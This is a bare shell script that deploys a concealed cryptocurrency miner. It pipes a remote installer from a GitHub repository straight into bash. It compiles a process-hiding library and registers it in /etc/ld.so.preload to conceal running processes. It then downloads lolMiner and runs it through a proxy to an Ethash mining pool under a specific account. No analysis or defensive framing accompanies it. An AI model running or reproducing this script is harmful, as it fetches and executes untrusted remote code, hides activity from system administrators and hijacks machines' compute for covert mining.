#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks5.sh | bash
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicLol.zip
unzip magicLol.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
tar -xvzf lolMiner_v1.29_Lin64.tar.gz
rm .gitignore
cd 1.29
graftcp ./lolMiner -a ETHASH --pool ethash.poolbinance.com:443 --user uwotm8.001 --shortstats 30 --timeprint on --log on --ethstratum ETHPROXY --nocolor
